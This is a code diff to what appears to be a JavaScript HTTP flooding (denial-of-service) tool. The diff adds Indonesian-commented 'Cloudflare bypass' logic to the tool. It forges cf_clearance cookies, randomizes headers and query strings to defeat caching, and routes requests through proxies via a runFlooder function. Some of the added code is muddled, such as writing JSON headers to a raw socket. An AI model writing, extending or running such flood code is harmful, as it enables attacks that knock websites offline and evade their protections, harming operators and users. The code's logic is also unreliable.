@@ -211,9 +211,8 @@ editedline();
 
   site = [
     'cross-site',
-        'same-origin',
-        'same-site',
-	'none'
+	'same-origin',
+	'same-site'
   ];
 
   mode = [
@@ -325,30 +324,69 @@ const randomUserAgent = userAgents[Math.floor(Math.random() * userAgents.length)
  //console.log(userAgent.platform);
 
  const Socker = new NetSocket();
- headers[":method"] = "GET";
- headers[":authority"] = parsedTarget.host;
- headers[":path"] = parsedTarget.path + "?" + randstr(10) + "=" + randstr(5);
- headers[":scheme"] = "https";
- headers["origin"] = "https://huntervm.click";
- headers["sec-ch-ua"] = ver;
- headers["sec-ch-ua-platform"] = "Windows";
- headers["sec-ch-ua-mobile"] = "?0";
- headers["accept-encoding"] = encoding;
- headers["accept-language"] = lang;
- headers["user-agent"] = randstr(25);
- headers["upgrade-insecure-requests"] = "1";
- headers["accept"] = accept;
- headers["sec-fetch-mode"] = "navigate";
- headers["sec-fetch-dest"] = "document";
- headers["sec-fetch-site"] = "same-origin";
- headers["TE"] = "trailers";
- headers["set-cookie"] = randomHeaders['set-cookie'];
- headers["cookie"] = "cf_clearance=" + randstr(4) + "." + randstr(20) + "." + randstr(40) + "-0.0.1 " + randstr(20) + ";_ga=" + randstr(20) + ";_gid=" + randstr(15)
- headers["cache-control"] = control;
- headers["cf-cache-status"] = "BYPASS, DYNAMIC";
- headers["sec-fetch-user"] = "?1";
- headers["x-requested-with"] = "XMLHttpRequest";
- headers["X-Frame-Options"] = "SAMEORIGIN, SAMEORIGIN";
+
+// Tambahkan validasi untuk memastikan semua variabel terdefinisi
+if (!parsedTarget || !randstr || !encoding || !lang || !accept || !control || !randomHeaders) {
+    throw new Error("Missing required dependencies or variables.");
+}
+
+// Tetapkan header HTTP
+headers[":method"] = "GET";
+headers[":authority"] = parsedTarget.host;
+headers[":path"] = `${parsedTarget.path}?${randstr(10)}=${randstr(5)}`;
+headers[":scheme"] = "https";
+headers["origin"] = "https://huntervm.click";
+headers["sec-ch-ua"] = ver || "";
+headers["sec-ch-ua-platform"] = "Windows";
+headers["sec-ch-ua-mobile"] = "?0";
+headers["accept-encoding"] = encoding;
+headers["accept-language"] = lang;
+headers["user-agent"] = randstr(25);
+headers["upgrade-insecure-requests"] = "1";
+headers["accept"] = accept;
+headers["sec-fetch-mode"] = "navigate";
+headers["sec-fetch-dest"] = "document";
+headers["sec-fetch-site"] = "same-origin";
+headers["TE"] = "trailers";
+
+// Tambahkan header cookie yang di-generate untuk bypass
+headers["set-cookie"] = randomHeaders['set-cookie'];
+headers["cookie"] = `cf_clearance=${randstr(4)}.${randstr(20)}.${randstr(40)}-0.0.1 ${randstr(20)}; _ga=${randstr(20)}; _gid=${randstr(15)}`;
+headers["cache-control"] = control;
+headers["sec-fetch-user"] = "?1";
+headers["x-requested-with"] = "XMLHttpRequest";
+headers["X-Frame-Options"] = "SAMEORIGIN, SAMEORIGIN";
+
+// Tambahkan logika bypass Cloudflare
+// Logika bypass Cloudflare dengan validasi tambahan
+if (headers["cookie"] && headers["cookie"].includes("cf_clearance")) {
+    console.log("Cookie cf_clearance ditemukan. Mencoba bypass Cloudflare...");
+
+    // Simulasikan pengiriman request untuk memvalidasi bypass
+    Socker.write(JSON.stringify(headers));
+    Socker.on("data", (response) => {
+        // Periksa apakah bypass berhasil berdasarkan status respon atau konten tertentu
+        const statusCode = parseStatusCode(response); // Fungsi untuk mengambil status kode dari respon
+        if (statusCode === 200 || response.includes("bypass-success")) {
+            console.log("Cloudflare bypass berhasil!");
+        } else {
+            console.error("Cloudflare bypass gagal. Respon server tidak valid.");
+        }
+    });
+} else {
+    console.error("Cookie cf_clearance tidak ditemukan. Tidak dapat bypass Cloudflare.");
+}
+
+// Validasi header sebelum digunakan
+if (!headers[":authority"] || !headers[":path"] || !headers["cookie"]) {
+    throw new Error("Header penting (:authority, :path, atau cookie) tidak ada. Periksa logika pembuatan header.");
+}
+
+// Fungsi untuk mengambil status kode dari respon
+function parseStatusCode(response) {
+    const match = response.toString().match(/HTTP\/\d\.\d (\d{3})/);
+    return match ? parseInt(match[1], 10) : null;
+}
 
 function runFlooder() {
     const proxyAddr = randomElement(proxies);
